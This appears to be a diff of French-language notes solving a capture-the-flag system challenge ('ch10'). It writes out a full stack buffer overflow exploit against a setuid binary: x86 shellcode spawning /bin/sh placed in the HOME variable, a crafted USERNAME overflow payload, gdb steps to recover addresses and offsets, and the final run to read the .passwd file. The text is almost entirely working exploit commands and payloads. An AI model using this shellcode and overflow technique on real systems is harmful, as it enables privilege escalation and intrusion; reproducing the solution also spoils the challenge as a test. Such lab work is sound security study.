@@ -1,4 +1,5 @@
-python -c 'print("USERNAME=" + "A"*136+ "\x08\xb0\x04\x08" + "T" * 28 + "\x73\xff\xff\xbf")' > /tmp/yolo
+## On place le shellcode dans HOME et on obtient son adresse.
+
 cd /tmp
 mkdir lol
 cd lol
@@ -20,35 +21,42 @@ gcc prog.c
 cd
 export HOME=$(printf '\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\x31\xd2\xcd\x80\x00\x00\x00\x00')
 
+
+## On cree un fichier avec un USERNAME que l'on overflow
+
 python -c 'print("USERNAME=" + "A"*136+ "BCDEFGHIJKLMNOPQRSTUVWXYZ")' > /tmp/yolo
 gdb ch10
 run /tmp/yolo
 ESI: 0x45444342
 --> convert to ascii --> EDCB
-retrouver l'adresse ou est stocke le PID du fichier qui a ete ecrase dans ESI pour l'y remettre afin quil ne segfault pas
+
+## On retrouve l'adresse ou est stocke le PID du fichier qui a ete ecrase dans ESI pour l'y remettre afin quil ne segfault pas
+
 gdb ch10
 disas Init
 break *0x080485c9
-pour obtenir le retour de ftopen
+## On obtient le retour de ftopen
 run /tmp/yolo
 EAX: 0x0804B008
 --> "\x08\xb0\x04\x08"
 
 python -c 'print("USERNAME=" + "A"*136+ "\x08\xb0\x04\x08")' > /tmp/yolo
 
-on rajoute les var d'env suivantes pour reduire le decalage de 2:
+## On rajoute les var d'env suivantes pour reduire le decalage de 2:
 export LINES=32
 export COLUMNS=56
-on obtient l'adresse ou est stocke le shellcode de l'env
+
+## On obtient l'adresse ou est stocke le shellcode de l'env
 /tmp/lol/a.out
 exemple: 0xbfffff6c
 --> "\x6b\xff\xff\xbf"
 (decalage d'un)
 
-on avance a taton pour trouver le segfault au bon endroit
+## On avance a taton pour trouver le segfault au bon endroit
 python -c 'print("USERNAME=" + "A"*136+ "\x08\xb0\x04\x08" + "B"*20 + "\x6b\xff\xff\xbf")' > /tmp/yolo
 
-on trouve lorsque B*28
+## Exemple :
 python -c 'print("USERNAME=" + "A"*136+ "\x08\xb0\x04\x08" + "B"*28 + "\x6b\xff\xff\xbf")' > /tmp/yolo
 
+./ch10 /tmp/yolo
 cat .passwd
